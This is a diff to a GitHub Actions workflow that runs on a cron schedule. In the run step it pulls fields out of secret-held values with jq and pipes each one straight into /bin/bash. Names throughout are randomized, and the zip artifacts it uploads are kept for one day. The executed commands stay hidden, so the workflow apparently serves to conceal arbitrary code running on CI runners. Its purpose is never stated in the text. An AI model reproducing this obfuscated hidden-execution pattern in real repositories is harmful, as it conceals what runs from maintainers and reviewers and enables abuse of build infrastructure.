@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '57 0,6,12,18 * * *'
+    - cron: '49 4,10,16,22 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -15,16 +15,18 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          o5867: ${{ secrets.o5867 }}
+          za20: ${{ secrets.za20 }}
         run: |
-          printf '%s' "$o5867" | jq -r .bbl5 | /bin/bash
-          printf '%s' "$gf13" | jq -r .z2 | /bin/bash
-          printf '%s' "$olf591" | jq -r .hdpn67804 | /bin/bash
-          printf '%s' "$i34" | jq -r .ic91684 | /bin/bash
+          printf '%s' "$za20" | jq -r .bh399 | /bin/bash
+          printf '%s' "$xfexl608" | jq -r .x16561 | /bin/bash
+          echo $d5434 | jq -r .z43890 | /bin/bash
+          printf '%s' "$p64407" | jq -r .bzvfz17 | /bin/bash
+          printf '%s' "$mditq588" | jq -r .h34143 | /bin/bash
+          echo $d59209 | jq -r .c32012 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: RMUf4cLJ
+          name: CYNCH9ar
           path: "*.zip"
           retention-days: 1
